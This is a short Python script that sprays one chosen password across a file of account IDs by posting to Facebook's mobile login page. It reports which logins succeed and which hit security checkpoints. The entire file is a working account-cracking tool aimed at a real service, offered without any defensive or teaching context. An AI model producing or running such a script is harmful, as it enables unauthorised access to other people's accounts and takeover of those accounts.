import requests, sys

def brute(id,pw):
		link = ("https://m.facebook.com/login.php")
		data = {"email":id, "pass":pw}
		r = requests.post(link, data=data)
		if "m_sess" in r.url or "save-device" in r.url:
			print("[~] found id : "+ id +" pass : "+ pw)
		elif "checkpoint" in r.url:
			print("[~] checkpoint id : "+ id)
		else:
			print("[!] failed id : "+id)

def list(file, pw):
	o = open(file, "r").readlines()
	for i in o:
		brute(i.strip(),pw)

if __name__ == '__main__':
	if sys.version[0] in "3":
		next
	else:
		print("[!] use python 3.*")
		exit()

	id = input("[*] input id list : ")
	pw = input("[*] pass to crack : ")
	o = open(id, "r").readlines()
	print("[~] loaded %s id"%(len(o)))
	print("[~] with password to crack : "+ pw)
	list(id,pw)
